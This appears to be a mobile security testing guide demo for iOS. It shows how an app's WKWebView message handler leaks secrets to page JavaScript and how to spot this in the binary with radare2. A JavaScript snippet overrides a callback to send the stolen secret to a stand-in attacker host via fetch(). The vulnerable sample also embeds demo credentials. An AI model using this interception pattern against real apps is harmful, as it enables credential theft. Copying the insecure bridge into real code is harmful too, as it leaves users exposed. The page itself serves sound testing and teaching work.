---
platform: ios
title: Sensitive Data Returned to Page JavaScript via evaluateJavaScript in a WKScriptMessageHandler
code: [swift]
id: MASTG-DEMO-0143
test: MASTG-TEST-0377
kind: fail
---

## Sample

This sample reuses the same vulnerable `WKWebView` setup from @MASTG-DEMO-0142. The `SecretBridgeHandler` implementation handles two bridge actions (`getSecret` and `getCredentials`) and returns sensitive native data to JavaScript by calling `evaluateJavaScript:completionHandler:`, injecting the data directly into the page's JavaScript context via a global callback function.

Any JavaScript running in the page can override those callback functions before the native handler fires them:

```javascript
// Attacker overrides the callback to intercept the response
window.receiveSecret = function(secret) {
    fetch("https://attacker.example.com/?leak=" + secret);
};
// Then triggers the bridge as normal
window.webkit.messageHandlers.bridge.postMessage({action: 'getSecret'});
```

{{ ../MASTG-DEMO-0142/MastgTest.swift }}

## Steps

1. Use @MASTG-TECH-0058 to extract the app. The main binary is `./Payload/MASTestApp.app/MASTestApp`.
2. Use @MASTG-TOOL-0073 with the `-i` option to run this script.

{{ evaluate_js_callback.r2 # run.sh }}

## Observation

The output shows all uses of the `evaluateJavaScript:completionHandler:` selector in the binary and the cross-references that identify the enclosing function.

{{ output.txt }}

## Evaluation

The test case fails because the app calls `evaluateJavaScript:completionHandler:` from within `SecretBridgeHandler.userContentController:didReceive:`, the `WKScriptMessageHandler` implementation, to inject sensitive data back into the page's JavaScript context.

Both xrefs point to `sym.MASTestApp.SecretBridgeHandler.userContentController.allocator.didReceive...`, confirming that both calls originate from the bridge handler:

1. The `getSecret` case loads the hardcoded API key `"MASTG_API_KEY=072037ab-..."` (at `0x00001514`) and the JavaScript template `"window.receiveSecret('"` (at `0x0000156c`), interpolates them into a single script string, and dispatches it via the `evaluateJavaScript:completionHandler:` selector at `0x00001698`.
2. The `getCredentials` case loads the credentials `"user=admin&pass=S3cr3t!"` (at `0x00001768`) and the JavaScript template `"window.receiveCredentials('"` (at `0x000017c0`), interpolates them, and dispatches the result via the same selector at `0x000018ec`.

Because `receiveSecret` and `receiveCredentials` are plain global functions defined in the page context, any JavaScript running on the page can override them before the native handler fires, intercepting the sensitive values on their way back from native code. Refer to @MASTG-BEST-0062 for the recommended alternative.
